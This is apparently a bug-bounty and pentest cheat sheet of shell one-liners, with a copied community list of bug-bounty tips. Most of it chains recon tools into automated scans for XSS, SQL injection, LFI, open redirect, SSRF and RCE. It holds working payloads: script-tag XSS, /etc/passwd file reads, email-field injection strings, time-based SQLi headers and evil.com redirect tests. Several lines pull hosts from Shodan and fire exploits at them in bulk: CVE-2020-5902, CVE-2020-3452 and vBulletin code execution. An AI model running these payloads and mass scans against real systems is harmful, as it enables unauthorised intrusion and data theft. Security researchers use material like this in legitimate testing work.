### ----------------------------------------------SİNGLE TARGET---------------------------------------------------------------------
## BUGBOUNTY

```bash
mkdir  "/home/$USER/Desktop/Bugbounty/domain.com" && cd  "/home/$USER/Desktop/Bugbounty/domain.com"  && subfinder -d  domain.com  -o subdomains -all    && cat subdomains  | dnsx -silent -a -resp-only   | sort -u > dnsx.txt && cat domains-sub.txt dnsx.txt > domains-sh.txt  && httpx -l domains-sh.txt   -o domains-httpx.txt &&  nuclei -l domains-httpx.txt     -o domains-nuclei.txt -me     report -stats  -si 300  -rc ~/.config/nuclei/report-config.yaml &&  echo "\033[1m WAYBACKURLS STARTED" "\033[0m"     &&  cat domains-httpx.txt | waybackurls | urldedupe > domains-waybackurls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-waybackurls.txt" "\033[0m"  && echo "\033[37m"  |  wc -l domains-waybackurls.txt   &&  echo "\033[37m\033[1m GF-XSS SCAN STARTED" "\033[0m"         && cat domains-waybackurls.txt | urldedupe | gf xss > domains-xss-urls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-xss-urls.txt"  "\033[0m"  && echo "\033[37m"  |  wc -l domains-xss-urls.txt    &&  echo "\033[37m\033[1m GF-REDİRECT SCAN STARTED" "\033[0m"         && cat domains-waybackurls.txt | urldedupe | gf redirect > domains-redirect-urls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED  domains-redirect-urls.txt"  "\033[0m"  && echo "\033[37m"  |  wc -l domains-redirect-urls.txt   &&  echo "\033[37m\033[1m GF-SQLİ SCAN STARTED" "\033[0m"        && cat domains-waybackurls.txt | urldedupe | gf sqli > domains-sqli-urls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-sqli-urls.txt"  "\033[0m" && echo "\033[37m"  |  wc -l domains-sqli-urls.txt    &&  echo "\033[37m\033[1m GF-LFİ SCAN STARTED" "\033[0m"        &&  cat domains-waybackurls.txt | urldedupe | gf lfi > domains-lfi-urls.txt  &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-lfi-urls.txt"   "\033[0m"   && echo "\033[37m"  |  wc -l domains-lfi-urls.txt       &&  echo "\033[37m\033[1m GF-SSRF SCAN STARTED" "\033[0m"          &&  cat domains-waybackurls.txt | urldedupe | gf ssrf > domains-ssrf-urls.txt   &&  echo "\033[37m\033[1m OK"  "\033[1m\033[32m SAVED domains-ssrf-urls.txt"   "\033[0m"  && echo "\033[37m"  |  wc -l domains-ssrf-urls.txt        &&  echo "\033[37m\033[1m GF-SSTİ SCAN STARTED" "\033[0m"         &&  cat domains-waybackurls.txt | urldedupe | gf ssti > domains-ssti-urls.txt   &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-ssti-urls.txt"  "\033[0m"   && echo "\033[37m"  |  wc -l domains-ssti-urls.txt       &&  echo "\033[37m\033[1m GF-RCE SCAN STARTED" "\033[0m"          &&  cat domains-waybackurls.txt | urldedupe | gf rce > domains-rce-urls.txt   &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-rce-urls.txt"   "\033[0m"   && echo "\033[37m"  |  wc -l domains-rce-urls.txt       &&  echo "\n\033[34m\033[1m XSS SCAN STARTED" "\033[0m"  && echo "\033[37m"  |  wc -l domains-xss-urls.txt   &&   cat domains-xss-urls.txt  | grep "=" | qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "\033[37m\033[1m "  "\033[40m\033[36m\033[1m" "$host" "\033[40m\033[31m\033[1m" Vulnerable;done  | tee domains-xss-poc.txt &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-xss-poc.txt"   &&  echo "\n\033[34m\033[1m OPEN-REDİRECT SCAN STARTED" "\033[0m"   && echo "\033[37m"  |  wc -l domains-redirect-urls.txt  &&  cat domains-redirect-urls.txt | grep "=" | qsreplace "http://evil.com/" | httpx -sc -title -mr "Evil.Com - We get it...Daily." -o domains-openredirect-poc.txt &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-openredirect-poc.txt" && echo "\n\033[34m\033[1m NOTİFY OPEN-REDİRECT SEND" "\033[0m" && notify -data domains-openredirect-poc.txt  -p discord -d 2 -silent  &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m domains-openredirect-poc.txt SUCCESSFULLY SENT TO DISCORD"  && echo "\n\033[34m\033[1m NOTİFY XSS SEND" "\033[0m" && notify -data domains-xss-poc.txt  -p discord -d 2 -silent   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m domains-xss-poc.txt SUCCESSFULLY SENT TO DISCORD"   && echo "\n\033[34m\033[1m NOTİFY NUCLEİ SEND" "\033[0m"  && echo "\033[37m"  |  wc -l domains-nuclei.txt    && notify -data domains-nuclei.txt  -p discord -d 2 -silent   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m domains-nuclei.txt SUCCESSFULLY SENT TO DISCORD" 
```

## PENTEST

```bash
mkdir  "/home/$USER/Desktop/Pentest/domain.com" && cd  "/home/$USER/Desktop/Pentest/domain.com" && subfinder -d  domains  -o domains-sub.txt -all     && cat domains-sub.txt  | dnsx -silent -a -resp-only   | sort -u > dnsx.txt && cat domains-sub.txt dnsx.txt > domains-sh.txt  && httpx -l domains-sh.txt   -o domains-httpx.txt &&  nuclei -l domains-httpx.txt    -o domains-nuclei.txt -me     report -stats  -si 300  -rc ~/.config/nuclei/report-config.yaml &&  echo "\033[1m WAYBACKURLS STARTED" "\033[0m"     &&  cat domains-httpx.txt | waybackurls | urldedupe > domains-waybackurls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-waybackurls.txt" "\033[0m"  && echo "\033[37m"  |  wc -l domains-waybackurls.txt   &&  echo "\033[37m\033[1m GF-XSS SCAN STARTED" "\033[0m"         && cat domains-waybackurls.txt | urldedupe | gf xss > domains-xss-urls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-xss-urls.txt"  "\033[0m"  && echo "\033[37m"  |  wc -l domains-xss-urls.txt    &&  echo "\033[37m\033[1m GF-REDİRECT SCAN STARTED" "\033[0m"         && cat domains-waybackurls.txt | urldedupe | gf redirect > domains-redirect-urls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED  domains-redirect-urls.txt"  "\033[0m"  && echo "\033[37m"  |  wc -l domains-redirect-urls.txt   &&  echo "\033[37m\033[1m GF-SQLİ SCAN STARTED" "\033[0m"        && cat domains-waybackurls.txt | urldedupe | gf sqli > domains-sqli-urls.txt &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-sqli-urls.txt"  "\033[0m" && echo "\033[37m"  |  wc -l domains-sqli-urls.txt    &&  echo "\033[37m\033[1m GF-LFİ SCAN STARTED" "\033[0m"        &&  cat domains-waybackurls.txt | urldedupe | gf lfi > domains-lfi-urls.txt  &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED domains-lfi-urls.txt"   "\033[0m"   && echo "\033[37m"  |  wc -l domains-lfi-urls.txt       &&  echo "\033[37m\033[1m GF-SSRF SCAN STARTED" "\033[0m"          &&  cat domains-waybackurls.txt | urldedupe | gf ssrf > domains-ssrf-urls.txt   &&  echo "\033[37m\033[1m OK"  "\033[1m\033[32m SAVED domains-ssrf-urls.txt"   "\033[0m"  && echo "\033[37m"  |  wc -l domains-ssrf-urls.txt        &&  echo "\033[37m\033[1m GF-SSTİ SCAN STARTED" "\033[0m"         &&  cat domains-waybackurls.txt | urldedupe | gf ssti > domains-ssti-urls.txt   &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-ssti-urls.txt"  "\033[0m"   && echo "\033[37m"  |  wc -l domains-ssti-urls.txt       &&  echo "\033[37m\033[1m GF-RCE SCAN STARTED" "\033[0m"          &&  cat domains-waybackurls.txt | urldedupe | gf rce > domains-rce-urls.txt   &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-rce-urls.txt"   "\033[0m"   && echo "\033[37m"  |  wc -l domains-rce-urls.txt       &&  echo "\n\033[34m\033[1m XSS SCAN STARTED" "\033[0m"  && echo "\033[37m"  |  wc -l domains-xss-urls.txt   &&   cat domains-xss-urls.txt  | grep "=" | qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "\033[37m\033[1m "  "\033[40m\033[36m\033[1m" "$host" "\033[40m\033[31m\033[1m" Vulnerable;done  | tee domains-xss-poc.txt &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-xss-poc.txt"   &&  echo "\n\033[34m\033[1m OPEN-REDİRECT SCAN STARTED" "\033[0m"   && echo "\033[37m"  |  wc -l domains-redirect-urls.txt  &&  cat domains-redirect-urls.txt | grep "=" | qsreplace "http://evil.com/" | httpx -sc -title -mr "Evil.Com - We get it...Daily." -o domains-openredirect-poc.txt &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED domains-openredirect-poc.txt" && echo "\n\033[34m\033[1m NOTİFY OPEN-REDİRECT SEND" "\033[0m" && notify -data domains-openredirect-poc.txt  -p discord -d 2 -silent  &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m domains-openredirect-poc.txt SUCCESSFULLY SENT TO DISCORD"  && echo "\n\033[34m\033[1m NOTİFY XSS SEND" "\033[0m" && notify -data domains-xss-poc.txt  -p discord -d 2 -silent   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m domains-xss-poc.txt SUCCESSFULLY SENT TO DISCORD"   && echo "\n\033[34m\033[1m NOTİFY NUCLEİ SEND" "\033[0m"  && echo "\033[37m"  |  wc -l domains-nuclei.txt    && notify -data domains-nuclei.txt  -p discord -d 2 -silent   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m domains-nuclei.txt SUCCESSFULLY SENT TO DISCORD" 

```
### ----------------------------------------------SİNGLE TARGET---------------------------------------------------------------------





### ----------------------------------------------MULTIPLE TARGET---------------------------------------------------------------------

## BUGBOUNTY

create target directory go inside directory
save domains in domains.txt file and run below command

```bash
subfinder -dL  domains  -o subdomains -all    && cat subdomains  | dnsx -silent -a -resp-only   | sort -u > dnsx && cat subdomains dnsx > subs-host  && httpx -l subs-host  -mc 200,301,302,404   -o httpx &&  nuclei -l httpx     -o nuclei -me     report -stats  -si 1800  -rc ~/.config/nuclei/report-config.yaml &&  echo "\033[1m WAYBACKURLS STARTED" "\033[0m"     &&  cat httpx | waybackurls | urldedupe > waybackurls &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED waybackurls" "\033[0m"  && echo "\033[37m"  |  wc -l waybackurls   &&  echo "\033[37m\033[1m GF-XSS SCAN STARTED" "\033[0m"         && cat waybackurls | urldedupe | gf xss > xss &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED xss"  "\033[0m"  && echo "\033[37m"  |  wc -l xss    &&  echo "\033[37m\033[1m GF-REDİRECT SCAN STARTED" "\033[0m"         && cat waybackurls | urldedupe | gf redirect > redirect &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED  redirect"  "\033[0m"  && echo "\033[37m"  |  wc -l redirect   &&  echo "\033[37m\033[1m GF-SQLİ SCAN STARTED" "\033[0m"        && cat waybackurls | urldedupe | gf sqli > sqli &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED sqli"  "\033[0m" && echo "\033[37m"  |  wc -l sqli    &&  echo "\033[37m\033[1m GF-LFİ SCAN STARTED" "\033[0m"        &&  cat waybackurls | urldedupe | gf lfi > lfi  &&  echo "\033[37m\033[1m OK" "\033[1m\033[32m SAVED lfi"   "\033[0m"   && echo "\033[37m"  |  wc -l lfi       &&  echo "\033[37m\033[1m GF-SSRF SCAN STARTED" "\033[0m"          &&  cat waybackurls | urldedupe | gf ssrf > ssrf   &&  echo "\033[37m\033[1m OK"  "\033[1m\033[32m SAVED ssrf"   "\033[0m"  && echo "\033[37m"  |  wc -l ssrf        &&  echo "\033[37m\033[1m GF-SSTİ SCAN STARTED" "\033[0m"         &&  cat waybackurls | urldedupe | gf ssti > ssti   &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED ssti"  "\033[0m"   && echo "\033[37m"  |  wc -l ssti       &&  echo "\033[37m\033[1m GF-RCE SCAN STARTED" "\033[0m"          &&  cat waybackurls | urldedupe | gf rce > rce   &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED rce"   "\033[0m"   && echo "\033[37m"  |  wc -l rce       &&  echo "\n\033[34m\033[1m XSS SCAN STARTED" "\033[0m"  && echo "\033[37m"  |  wc -l xss   &&   cat xss  | grep "=" | qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "\033[37m\033[1m "  "\033[40m\033[36m\033[1m" "$host" "\033[40m\033[31m\033[1m" Vulnerable;done  | tee xss-poc &&  echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED xss-poc"   &&  echo "\n\033[34m\033[1m OPEN-REDİRECT SCAN STARTED" "\033[0m"   && echo "\033[37m"  |  wc -l redirect  &&  cat redirect | grep "=" | qsreplace "http://evil.com/" | httpx -sc -title -mr "Evil.Com - We get it...Daily." -o openredirect-poc &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED openredirect-poc" && echo "\n\033[34m\033[1m NOTİFY OPEN-REDİRECT SEND" "\033[0m" && notify -data openredirect-poc  -p discord -d 2 -silent  &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m openredirect-poc SUCCESSFULLY SENT TO DISCORD"  && echo "\n\033[34m\033[1m NOTİFY XSS SEND" "\033[0m" && notify -data xss-poc  -p discord -d 2 -silent   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m xss-poc SUCCESSFULLY SENT TO DISCORD"   && echo "\n\033[34m\033[1m NOTİFY NUCLEİ SEND" "\033[0m"  && echo "\033[37m"  |  wc -l nuclei    && notify -data nuclei  -p discord -d 2 -silent   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m nuclei SUCCESSFULLY SENT TO DISCORD" 
```


### ----------------------------------------------MULTIPLE TARGET---------------------------------------------------------------------




## ProjectDiscovery CHAOS project
```bash
wget "https://chaos-data.projectdiscovery.io/index.json" && cat index.json | grep "URL" | sed 's/"URL": "//;s/",//' | while read host do;do wget "$host";done && for i in `ls -1 | grep .zip$`; do unzip $i; done && rm *.zip && cat *.txt >> all.txt    && cat all.txt  | dnsx -silent -a -resp-only   | sort -u > all-dnsx.txt && cat all.txt all-dnsx.txt > all-sh.txt    && httpx -l all-sh.txt  -o all-httpx.txt  && nuclei -l all-httpx.txt  -o all-nuclei-scan.txt -stats  -si 300 
```



## SQLi OneLiner
```bash
subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent  > urls ; sqlmap -m urls --batch --random-agent --level 1  --risk 1  | tee sqlmap.txt 
```









## Subdomain Takeover
Aquatone 3 command under 

1. aquatone-discover -d  nakia.com --disable-collectors dictionary
2. aquatone-scan -d nakia.com  (copy and paste on terminal)
3. aquatone-takeover -d nakia.com copy and paste 


```bash
aquatone-discover -d $domain --disable-collectors dictionary | aquatone-scan -d $domain | aquatone-takeover -d $domain
```


## 	Auto scanner
```bash
subfinder -d site.com -all | naabu | httpx | nuclei -t nuclei-templates
```

## Otomatik sqli scanner command

```bash
subfinder -d  ccs-test.ual.com -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --risk=3 --level=5 --random-agent --user-agent  -v 3 --threads=10 --tamper=space2morecomment,between --batch | tee -a sqli.txt
```



## Otomatik wordpress mysql.sql dosyası scanner command


```bash
subfinder -d www.cm.gomedigap.com -silent | httpx -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -ports 80,443,8080,8443
```



## log4j and attlassian scanner
```bash
nuclei -t cves/2021/CVE-2021-44228.yaml -l domain.txt  -o CVE-2021-44228-scan.txt  -me log4j-rce
```

```bash
nuclei -l domains.txt  -tags atlassian -severity medium,high,critical -vv -o atlassian-scan.txt -me atlassian
```

## nuclei tags scan
```bash
nuclei -l domains.txt  -tags cve,panel,edb,lfi,xss,rce   -severity medium,high,critical -vv -o tags-scan.txt -me report
```

## xss automation

```bash
cat domain.com-active.txt |  waybackurls | uro | gf xss |  dalfox pipe   --only-poc='r,v'    --ignore-return 302,404,403 --custom-payload ~/Desktop/WEB/XSS/xss-payload-top.txt

cat {hedef}-xss-urls.txt  |  dalfox pipe   --only-poc="r,v"    --ignore-return 302,404,403  -o  {hedef}-xss-dalfox-scan.txt --ignore-param api_token --ignore-param csrf_token
```
```bash
echo "\n\033[34m\033[1m DALDOX-XSS SCAN STARTED" "\033[0m"   && echo "\033[37m"  |  wc -l {hedef}-xss-urls.txt  &&  cat {hedef}-xss-urls.txt  |  dalfox pipe   --only-poc="v"    --ignore-return 302,404,403  -o  {hedef}-xss-dalfox-poc.txt --ignore-param api_token --ignore-param csrf_token --custom-payload ~/Desktop/WEB/XSS/xss-payload-top.txt   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m SAVED {hedef}-xss-dalfox-poc.txt" && echo "\n\033[34m\033[1m NOTİFY DALFOX SEND" "\033[0m"  && echo "\033[37m"  |  wc -l {hedef}-xss-dalfox-poc.txt    && notify -data {hedef}-xss-dalfox-poc.txt  -p discord -d 2 -silent   &&   echo "\033[37m\033[1m OK"   "\033[1m\033[32m {hedef}-xss-dalfox-poc.txt SUCCESSFULLY SENT TO DISCORD"
```


## backup  .zip dosya bulma
```bash
cat domain.list | waybackurls | grep .zip
```


##	SQL injection Oneliner

```bash
subfinder -dL domains.txt   | dnsx | waybackurls | uro  | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --risk 3 --level 5 --hex   | tee sqlmap.txt
```


## Local File Inclusion lfi

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```


## Open-redirect

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

## xss

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a |  dalfox pipe   --only-poc r --silence    --ignore-return 302,404,403 | tee OUT.txt
```

##	Find Hidden Servers and/or Admin Panels

```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
```

## gizli dizinleri bulmak için
```bash
dirsearch -l domain.com-sub.txt  -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --tor --full-url -o domain.com-dirsearch-output.txt



gobuster dir -u https://siteniz.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --wildcard
```



## **Header Injection**
```
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com


## **XSS Injection**
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
test+”<%= 7*7 %>’(</script></style></title></textarea><svg/onload=al\u0065rt`1`>)@example
.com


## **SST Injection**
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com


## **SQL Injection**
"' OR 1=1 -- '"@example.com
"mail'); SLEEP(5);--"@example.com


## **SSRF Attack**
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

## Time Based SQL injection Tips
```
X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'
User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"

```




```bash
ffuf -c -w ~/Desktop/WEB/wordlist/ffuf/common.txt  -u https://domain.com/FUZZ -fc 301,302,307,403,405,500 -ac

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u https://www.kristlik.edu.ee/FUZZ -fc 301,302,307,403,405,500 -ac

while read domain; do ffuf -u $domain/FUZZ -w  ~/Desktop/WEB/wordlist/onelistforallshort.txt; done < domains.txt
```



## XSS
```bash
echo http://target.com | subfinder -dL domains -silent | waybackurls | gf xss | sort -u | nuclei -tags xss -rl 20 -c 10

echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"


gospider -S domain.com-active.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe   --only-poc r --silence    --ignore-return 302,404,403 | tee domain.com-xss-report.txt
```

## SSRF
```bash
subfinder -d domain.com | httpx -silent -threads 1000 | waybackurls | grep "=" | qsreplace YOUR.burpcollaborator.net
```





https://reconshell.com/awesome-one-liner-bug-bounty/

A collection of awesome one-liner scripts especially for bug bounty tips.

This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily welcome.
###Local File Inclusion

@dwisiswant0

gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

###Open-redirect

@dwisiswant0

export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

@N3T_hunt3r

cat waybackurl.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null

###XSS

@cihanmehmet

gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt

@fanimalikhack

 waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt

###Prototype Pollution

@R0X4R

subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

###CVE-2020-5902

@Madrobot_

shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

###CVE-2020-3452

@vict0ni

while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt

###vBulletin 5.6.2 – ‘widget_tabbedContainer_tab_panel’ Remote Code Execution

@Madrobot_

shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;

###Find JS Files

@D0cK3rG33k

assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done

###Extract Endpoints from JS File

@renniepak

cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

###Get CIDR & Orgz from Target Lists

@steve_mcilwain

for DOMAIN in $(cat domains.txt);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done

###Get Subdomains from RapidDNS.io

@andirrahmani1

curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u

## Get Subdomains from BufferOver.run

@_ayoubfathi_

curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u

@AnubhavSingh_

curl "https://tls.bufferover.run/dns?q=$DOMAIN" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$DOMAIN"

###Get Subdomains from Riddler.io

@pikpikcu

curl -s "https://riddler.io/search/exportcsv?q=pld:domain.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

###Get Subdomains from VirusTotal

@pikpikcu

curl -s "https://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

###Get Subdomain with cyberxplore

@pikpikcu

curl https://subbuster.cyberxplore.com/api/find?domain=yahoo.com -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+"

###Get Subdomains from CertSpotter

@caryhooper

curl -s "https://certspotter.com/api/v1/issuances?domain=domain.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | tr -d '[]"\n ' | tr ',' '\n'

###Get Subdomains from Archive

@pikpikcu

curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

###Get Subdomains from JLDC

@pikpikcu

curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

###Get Subdomains from securitytrails

@pikpikcu

curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u

###Bruteforcing subdomain using DNS Over

@pikpikcu

while read sub;do echo "https://dns.google.com/resolve?name=$sub.domain.com&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u ; done < wordlists.txt

###Get Subdomains With sonar.omnisint.io

@pikpikcu

curl --silent https://sonar.omnisint.io/subdomains/twitter.com | grep -oE "[a-zA-Z0-9._-]+\.twitter.com" | sort -u

###Get Subdomains With synapsint.com

@pikpikcu

curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2Fdomain.com" | grep -oE "[a-zA-Z0-9._-]+\.domain.com" | sort -u

###Get Subdomains from crt.sh

@vict0ni

curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

###Sort & Tested Domains from Recon.dev

@stokfedrik

curl "https://recon.dev/api/search?key=apikey&domain=example.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u |httpx -silent

###Subdomain Bruteforcer with FFUF

@GochaOqradze

ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'

###Find All Allocated IP ranges for ASN given an IP address

wains.be

whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n

###Extract IPs from a File

@emenalf

grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt

###Ports Scan without CloudFlare

@dwisiswant0

subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe

###Create Custom Wordlists

@tomnomnom

gau domain.com| unfurl -u keys | tee -a wordlist.txt ; gau domain.com | unfurl -u paths|tee -a ends.txt; sed 's#/#\n#g' ends.txt  | sort -u | tee -a wordlist.txt | sort -u ;rm ends.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' wordlist.txt

